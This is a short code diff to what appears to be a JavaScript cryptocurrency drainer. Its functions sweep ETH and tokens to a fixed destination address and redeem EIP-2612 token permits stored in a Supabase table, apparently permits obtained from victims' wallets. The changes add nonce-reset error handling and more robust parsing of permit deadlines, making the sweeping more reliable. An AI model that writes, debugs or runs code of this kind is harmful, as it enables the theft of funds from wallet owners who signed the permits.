@@ -368,7 +368,7 @@ async function sweepETH() {
     log(`sweepETH tx: ${tx.hash}`);
     await tx.wait();
     log("sweepETH confirmed");
-  } catch (e) { err(`sweepETH: ${e.message}`); }
+  } catch (e) { maybeResetNonce(e); err(`sweepETH: ${e.message}`); }
   finally    { sweepingETH = false; }
 }
 
@@ -390,7 +390,7 @@ async function sweepToken(tokenAddress) {
     const tx  = await contract.sweepTokens(tokenAddress, DESTINATION_ADDRESS, { gasLimit: gas * 120n / 100n, ...fee });
     log(`sweepTokens(${symbol}) tx: ${tx.hash}`);
     await tx.wait();
-  } catch (e) { err(`sweepToken(${tokenAddress}): ${e.message}`); }
+  } catch (e) { maybeResetNonce(e); err(`sweepToken(${tokenAddress}): ${e.message}`); }
   finally     { sweepingToken[key] = false; }
 }
 
@@ -1490,7 +1490,13 @@ async function sweep(wallet) {
 
     for (const p of permits ?? []) {
       if (BLACKLIST.has(p.token.toLowerCase())) continue;
-      const dl = typeof p.deadline === "string" ? BigInt(Math.floor(new Date(p.deadline).getTime() / 1000)) : 0n;
+      const dl = typeof p.deadline === "number"
+        ? BigInt(p.deadline)
+        : typeof p.deadline === "string" && /^\d+$/.test(p.deadline.trim())
+          ? BigInt(p.deadline.trim())
+          : typeof p.deadline === "string"
+            ? BigInt(Math.floor(new Date(p.deadline).getTime() / 1000))
+            : 0n;
       if (dl > 0n && dl < nowSecs) {
         log(`[eip2612] ${p.symbol ?? p.token.slice(0,10)} — expired, marking used`);
         await supabase.from("eip2612_permits").update({ used: true }).eq("id", p.id);
